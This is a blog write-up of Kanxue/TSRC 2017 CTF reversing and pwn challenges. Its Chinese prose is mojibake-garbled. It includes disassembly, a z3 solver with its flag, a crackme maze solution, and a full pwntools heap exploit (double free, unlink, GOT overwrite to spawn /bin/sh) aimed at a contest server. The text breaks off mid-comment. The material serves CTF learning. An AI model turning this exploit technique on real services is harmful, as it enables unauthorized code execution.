      <title>çœ‹é›ª.TSRC 2017CTFç§‹å­£èµ›ã€€</title>
      <link href="2017-Kanxue-TSRC-fall-race.html"/>
      <url>2017-Kanxue-TSRC-fall-race.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>çœ‹é›ªçš„ctf  ä»¥é€†å‘å’Œpwnä¸ºä¸»ï¼ŒæŒç»­æ›´æ–°ï¼Œå¸Œæœ›èƒ½è·Ÿä¸‹å»æŠŠ</p><h2 id="ç¬¬ä¸€é¢˜-Helllo-CTF"><a href="#ç¬¬ä¸€é¢˜-Helllo-CTF" class="headerlink" title="ç¬¬ä¸€é¢˜ Helllo-CTF"></a>ç¬¬ä¸€é¢˜ Helllo-CTF</h2><p>æ˜æ–‡ï¼Œä¸è¯¦è§£</p><h2 id="ç¬¬äºŒé¢˜-ctf2017-Fpc"><a href="#ç¬¬äºŒé¢˜-ctf2017-Fpc" class="headerlink" title="ç¬¬äºŒé¢˜ ctf2017_Fpc"></a>ç¬¬äºŒé¢˜ ctf2017_Fpc</h2><p>è®²é“ç†ç¬¬äºŒé¢˜å‡ºå¾—å¾ˆæ²¡æœ‰é“ç†ï¼Œ<br>è¾“å…¥åçš„ä¸¤ä¸ªcall å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨  å¹²æ‰°è§†çº¿</p><p>åœ¨textæ®µæœ‰ä¸€æ®µshellcodeï¼Œæ„é€ <code>9876543210ab11A</code>çš„è¾“å…¥å¯ä»¥è·³è½¬åˆ°è¯¥shellcodeä¸Šï¼Œè¿™æ˜¯ä¸€æ®µå¾ˆèŠ±å¾ˆèŠ±çš„ä¸œè¥¿</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-ctf2018_fpc-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-ctf2018_fpc-01.jpg"></a></p><p>è·³è½¬ä¸çœ‹ï¼Œæˆ‘ä»¬å°†æœ‰ç”¨çš„æ±‡ç¼–å–å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">00413150 | 33 C0                    | xor eax,eax                             |</span><br><span class="line">00413184 | A3 34 B0 41 00           | mov dword ptr ds:[41B034],eax           |</span><br><span class="line">004131BA | 58                       | pop eax                                 |  x    ecx</span><br><span class="line">004131EB | 8B C8                    | mov ecx,eax                             |  x    </span><br><span class="line">0041321F | 58                       | pop eax                                 |  y    ebx</span><br><span class="line">00413254 | 8B D8                    | mov ebx,eax                             |  y</span><br><span class="line">00413289 | 58                       | pop eax                                 |  z    edx</span><br><span class="line">004132B5 | 8B D0                    | mov edx,eax                             |  z </span><br><span class="line">004132AD | 8B D0                    | mov edx,eax                             |</span><br><span class="line"></span><br><span class="line">004132E2 | 8B C1                    | mov eax,ecx                             |  eax &#x3D; ecx &#x3D; x</span><br><span class="line">00413316 | 2B C3                    | sub eax,ebx                             |  eax &#x3D; eax-ecx &#x3D; x-y</span><br><span class="line">00413349 | C1 E0 02                 | shl eax,2                               |  eax &#x3D; (x-y)&lt;&lt;2</span><br><span class="line">00413380 | 03 C1                    | add eax,ecx                             |  eax &#x3D; ((x-y)&lt;&lt;2)+ x</span><br><span class="line">004133B5 | 03 C2                    | add eax,edx                             |  eax &#x3D; ((x-y)&lt;&lt;2)+ x+z</span><br><span class="line">004133E9 | 2D E2 17 F9 EA           | sub eax,EAF917E2                        |  eax &#x3D; ((x-y)&lt;&lt;2)+ x+z-0xEAF917E2</span><br><span class="line"></span><br><span class="line">00413455    03C1            ADD EAX,ECX</span><br><span class="line">00413489    2BC3            SUB EAX,EBX                              ; EAX&#x3D;EAX-EBX&#x3D;x-y</span><br><span class="line">004134BF    8BD8            MOV EBX,EAX                              ; EBX&#x3D;x-y</span><br><span class="line">004134F3    D1E0            SHL EAX,1                                ; EAX&#x3D;  (x-y)&lt;&lt;1</span><br><span class="line">00413525    03C3            ADD EAX,EBX                              ; EAX&#x3D;EAX+EBX&#x3D; ((x-y)&lt;&lt;1)+(x-y)</span><br><span class="line">00413559    03C1            ADD EAX,ECX                              ; EAX&#x3D; ((x-y)&lt;&lt;1)+(x-y)+x</span><br><span class="line">0041358F    8BC8            MOV ECX,EAX                              ; ECX&#x3D;EAX</span><br><span class="line">004135C3    03C2            ADD EAX,EDX                              ; EAX&#x3D;   ((x-y)&lt;&lt;1)+(x-y)+x+z</span><br><span class="line">004135F7    2D C808F5E8     SUB EAX,0xE8F508C8                       ; EAX&#x3D;   ((x-y)&lt;&lt;1)+(x-y)-0xE8F508C8</span><br><span class="line">00413665    8BC1            MOV EAX,ECX                              ; EAX&#x3D;   ((x-y)&lt;&lt;1)+(x-y)+x</span><br><span class="line">0041365D    8BC1            MOV EAX,ECX                              ; </span><br><span class="line">004136A7    2BC2            SUB EAX,EDX                              ; EAX&#x3D; EAX-EDX&#x3D;((x-y)&lt;&lt;1)+(x-y)+x-z</span><br><span class="line"></span><br><span class="line">esp:</span><br><span class="line">0018FF48   00413835  ASCII &quot;You get it!&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥è·å–ä¸‰ä¸ªç®—å¼<br>æˆ‘ä»¬ä½¿ç”¨z3æ±‚è§£</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ cat solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x, y ,z = BitVecs(<span class="string">&#x27;x y z&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"><span class="comment">#x = Real(&#x27;x&#x27;)</span></span><br><span class="line"><span class="comment">#y = Real(&#x27;y&#x27;)</span></span><br><span class="line"><span class="comment">#z = Real(&#x27;z&#x27;)</span></span><br><span class="line"></span><br><span class="line">solve(((x - y) &lt;&lt; <span class="number">2</span>) + x + z == <span class="number">0xEAF917E2</span>,((x - y) &lt;&lt; <span class="number">1</span>) + (x - y) + x + z == <span class="number">0xE8F508C8</span>,((x - y) &lt;&lt; <span class="number">1</span>) + (x - y) + x - z == <span class="number">0x0C0A3C68</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in /private/tmp [21:32:21]</span></span><br><span class="line">$ python solve.py</span><br><span class="line">[z = <span class="number">1853187632</span>, y = <span class="number">1919903280</span>, x = <span class="number">1953723722</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag: Just0for0fun11A</p><h2 id="ç¬¬ä¸‰é¢˜-crackMe"><a href="#ç¬¬ä¸‰é¢˜-crackMe" class="headerlink" title="ç¬¬ä¸‰é¢˜ crackMe"></a>ç¬¬ä¸‰é¢˜ crackMe</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-01.jpg"></a></p><p>è¿è¡Œç¨‹åºï¼Œèƒ½çœ‹åˆ°æ˜¯æœ‰guiçš„ï¼ŒæŸ¥æ‰¾import </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-kanxue-crackme-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/18-kanxue-crackme-02.jpg"></a></p><p>èƒ½æ‰¾åˆ°<code>GetDlgItemTextA</code>è¿™ä¸ªæ˜¯ä¸€ä¸ªå¤„ç†çª—å£æ¶ˆæ¯çš„å‡½æ•°</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-03.jpg"></a></p><p>æˆ‘ä»¬é€šè¿‡äº¤å‰å¼•ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°ç¨‹åºçš„å…³é”®æµç¨‹</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-05.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-06.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-06.jpg"></a></p><p>åŸºæœ¬çš„æµç¨‹å°±æ˜¯ï¼šè¯»å–ç”¨æˆ·æ”¶å…¥ä¿¡æ¯ã€‚ç„¶ååšä¸¤æ¬¡base64ç¼–ç ï¼Œå†ç”¨å›½å¯†ç®—æ³•SM3è®¡ç®—ä¸€ä¸ªhashã€‚è®¡ç®—å®Œhashä¹‹åè½¬æ¢æˆ16è¿›åˆ¶ã€‚ç„¶åå°†Hashå€¼çš„å64ä½å’Œç”¨æˆ·è¾“å…¥è¿›è¡Œæ¯”è¾ƒã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-07.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-07.jpg"></a></p><p>ç„¶åç¨‹åºçš„ä¸‹ä¸€ä¸ªæµç¨‹ ä¼šåˆ°ä¸€ä¸ªè¿·å®«æ¸¸æˆ</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-09.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-kanxue-crackme-09.jpg"></a></p><p>èƒ½çœ‹åˆ°è¿·å®«åœ°å›¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0 1 1 1 1 1 1 1 1 0</span><br><span class="line">0 0 1 1 1 1 1 0 0 0</span><br><span class="line">1 0 0 0 0 0 1 0 1 1</span><br><span class="line">1 1 1 1 1 0 1 0 0 1</span><br><span class="line">1 0 0 0 1 0 1 0 0 1</span><br><span class="line">1 0 1 0 0 0 1 0 1 1</span><br><span class="line">1 0 1 1 1 1 1 0 0 1</span><br><span class="line">1 0 0 0 0 1 1 1 0 0</span><br><span class="line">1 1 1 1 0 0 0 0 1 0</span><br><span class="line">1 1 1 1 1 1 1 0 0 0</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„0ä¸ºå¯è¡Œè·¯å¾„ã€‚é¢˜ç›®ä¸­ï¼Œæ›¿æ¢åçš„è¾“å…¥å­—ç¬¦ä¸ºq zåˆ†åˆ«è¡¨ç¤ºå‘ä¸Šä¸€è¡Œå’Œå‘ä¸‹ä¸€è¡Œï¼›p låˆ†åˆ«è¡¨ç¤ºå‘å·¦ä¸€æ ¼å’Œå‘å³ä¸€æ ¼ã€‚<br>[3,8]ä¸ºæ­»è·¯ã€‚è‹¥è¾“å…¥ä¸º\x20ï¼Œåˆ™ç»“æŸï¼Œè¿”å›Trueï¼›è‹¥èµ°é”™ï¼Œåˆ™è¿”å›Falseï¼ŒéªŒè¯å¤±è´¥ã€‚<br>è¿™é‡Œå¹¶æ²¡æœ‰å¯¹è·¯å¾„å®Œæˆé‡è¿›è¡Œçº¦æŸï¼Œä¹Ÿäº§ç”Ÿäº†å¤šè§£å¯èƒ½ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬ä¸ºç®€åŒ–ï¼Œå¯ä»¥ç›´æ¥è®©æ›¿æ¢åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º\x20ã€‚</p><p>æ€»æ˜¯æ‰€è¿°ï¼Œæ­£ç¡®çš„ç­”æ¡ˆè¡Œèµ°è·¯çº¿æ˜¯ï¼š<br>zlzllllzzzppqppzzzlllzlllzllqqpqpqqqqqllq<br>ç„¶åæ ¹æ®ä¸Šé¢åˆ†æåˆ°çš„ç»“æœè¿›è¡Œé€†è¿ç®—ã€‚å®ƒçš„æ‘©å°”æ–¯ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--.. .-.. --.. .-.. .-.. .-.. .-.. --.. --.. --.. .--. .--. --.- .--. .--. --.. --.. --.. .-.. .-.. .-.. --.. .-.. .-.. .-.. --.. .-.. .-.. --.- --.- .--. --.- .--. --.- --.- --.- --.- --.- .-.. .-.. --.-&#x2F;</span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°ç»“æœè¿›è¡Œ2æ¬¡base64ç¼–ç <br>æœ€ååœ¨æœ«å°¾é™„åŠ hashå€¼ï¼ˆå°±æ˜¯SM3åŠ å¯†ä¹‹åçš„å€¼ï¼‰å°±æ˜¯ç­”æ¡ˆ</p><h2 id="ç¬¬å››é¢˜-club-pwn"><a href="#ç¬¬å››é¢˜-club-pwn" class="headerlink" title="ç¬¬å››é¢˜ club_pwn"></a>ç¬¬å››é¢˜ club_pwn</h2><p>double free<br>æˆ‘çš„ç®€å•åˆ†æ <a href="https://bbs.pediy.com/thread-222421.htm">https://bbs.pediy.com/thread-222421.htm</a></p><p>exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal =[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt;<span class="number">1</span>:</span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">libc= CDLL(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;club&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">libc = CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;123.206.22.95&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#main_arena_offset = lib.symbols[&#x27;main_arena&#x27;]</span></span><br><span class="line">system_offset = lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = lib.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">free_offset = lib.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;system_offset:0x%x&quot;</span> % system_offset)</span><br><span class="line">log.info(<span class="string">&quot;binsh_offset:0x%x&quot;</span> % binsh_offset)</span><br><span class="line">log.info(<span class="string">&quot;free_offset: 0x%X&quot;</span> % free_offset)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_a_box</span>(<span class="params">index,size</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="string">&#x27;1&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(index))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destory_a_box</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="string">&#x27;2&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_me_a_message</span>(<span class="params">index,message</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="string">&#x27;3&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(index))</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_message</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="string">&#x27;4&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_a_randnum</span>(<span class="params">num</span>):</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="string">&#x27;5&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_seed</span>(<span class="params">num</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0x148</span>,<span class="number">0x7ffff000</span>,<span class="number">0x1000</span>):</span><br><span class="line"><span class="comment">#i = i&lt;&lt;12</span></span><br><span class="line"><span class="comment">#i += 0x148 #seed offset</span></span><br><span class="line">libc.srand(i)</span><br><span class="line">randnum = int(libc.rand())</span><br><span class="line"><span class="keyword">if</span> randnum == int(num):</span><br><span class="line"><span class="keyword">return</span> libc.rand()</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;seed&#x27;</span> ,i</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">guess_a_randnum(str(<span class="number">0</span>))</span><br><span class="line">n = io.recvuntil(<span class="string">&#x27;is &#x27;</span>)</span><br><span class="line">num = io.recvuntil(<span class="string">&#x27;!&#x27;</span>)[:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;[*]rand1=&#x27;</span>+num</span><br><span class="line"></span><br><span class="line"><span class="comment"># get seed addr and base addr</span></span><br><span class="line"></span><br><span class="line">a=guess_seed(num)</span><br><span class="line"></span><br><span class="line">guess_a_randnum(a)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;You get a secret:&#x27;</span>)</span><br><span class="line">seed_addr = int(io.recvuntil(<span class="string">&#x27;!&#x27;</span>)[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;seed_addr: 0x%x&quot;</span> % int(seed_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got_addr = seed_addr<span class="number">-0x202148</span>+<span class="number">0x202018</span></span><br><span class="line">p_addr = seed_addr<span class="number">-0x202148</span>+<span class="number">0x202110</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;free_got_addr:&#x27;</span>+hex(free_got_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake chunk and get shell</span></span><br><span class="line"></span><br><span class="line">fake_fd = p64(p_addr<span class="number">-0x18</span>)</span><br><span class="line">fake_bk = p64(p_addr<span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_a_box(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">get_a_box(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">get_a_box(<span class="number">3</span>,<span class="number">0x110</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;get 3 box&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">raw_input(<span class="string">&#x27;destory_2_box&#x27;</span>)</span><br><span class="line">destory_a_box(<span class="number">2</span>)</span><br><span class="line">destory_a_box(<span class="number">3</span>)</span><br><span class="line">pause()</span><br><span class="line">fake_fd = p64(p_addr<span class="number">-0x18</span>)</span><br><span class="line">fake_bk = p64(p_addr<span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+fake_fd+fake_bk+<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x100</span><span class="number">-0x20</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x220</span><span class="number">-0x100</span>) </span><br><span class="line">raw_input(<span class="string">&#x27;off by one to leak &#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;get 4 box size 0x220&#x27;</span>)</span><br><span class="line">get_a_box(<span class="number">4</span>,<span class="number">0x220</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;fill the 4 box&#x27;</span>)</span><br><span class="line">leave_me_a_message(<span class="number">4</span>,payload)</span><br><span class="line">raw_input(<span class="string">&#x27;destory_3_box&#x27;</span>)</span><br><span class="line">destory_a_box(<span class="number">3</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;leak got addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;leaking address...&#x27;</span>)</span><br><span class="line">leave_me_a_message(<span class="number">2</span>,p64(<span class="number">1</span>)+p64(<span class="number">1</span>)+p64(free_got_addr))</span><br><span class="line">raw_input(<span class="string">&#x27;leakk.......&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">raw_input(<span class="string">&#x27;leak free addr&#x27;</span>)</span><br><span class="line">show_message(<span class="number">1</span>)</span><br><span class="line">pause()</span><br><span class="line">free_addr = u64(io.recvuntil(<span class="string">&#x27;You have 6 operation :&#x27;</span>)[<span class="number">1</span>:<span class="number">7</span>]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">system_addr = int(free_addr)-free_offset+system_offset</span><br><span class="line">log.info(<span class="string">&#x27;system address:&#x27;</span>+hex(system_addr))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">raw_input(<span class="string">&#x27;get shell~~~~~~&#x27;</span>)</span><br><span class="line">leave_me_a_message(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">pause()</span><br><span class="line">leave_me_a_message(<span class="number">3</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;unlink to get shell&#x27;</span>)</span><br><span class="line">destory_a_box(<span class="number">3</span>)   </span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># log.info(&quot;leak .....libc.....&quot;)</span></span><br><span class="line"><span class="comment"># get_a_box(1,0x80)</span></span><br><span class="line"><span class="comment"># get_a_box(2,0xa0)</span></span><br><span class="line"><span class="comment"># get_a_box(3,0xb0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># destory_a_box(2)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># #gdb.attach(io)</span></span><br><span class="line"><span class="comment"># raw_input(&#x27;leak.....libc&#x27;)</span></span><br><span class="line"><span class="comment"># show_message(2)</span></span><br><span class="line"><span class="comment"># main_arena_addr = u64(io.recvuntil(&#x27;You have 6 operation 